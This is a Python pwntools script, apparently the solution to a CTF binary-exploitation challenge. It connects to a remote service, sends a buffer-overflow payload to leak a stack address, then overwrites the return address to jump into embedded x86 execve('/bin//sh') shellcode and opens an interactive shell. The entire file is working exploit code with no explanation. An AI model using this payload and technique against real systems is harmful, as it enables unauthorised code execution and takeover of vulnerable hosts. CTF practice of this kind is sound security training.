from pwn import *

context.log_level = 'debug'

sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

x = remote("20.41.78.41", 8881)
#x = process("./pwn1")

payload = "\x90" * 20
payload += p32(0x08048087)

pause()
x.recvuntil("Let's start the CTF:")
x.send(payload)
#x.recv(8)
stack = u32(x.recv(4))
print(hex(stack))

payload = "a"*20
payload += p32(stack+0x14)
payload += sh


x.send(payload)


x.interactive()
#x.close()

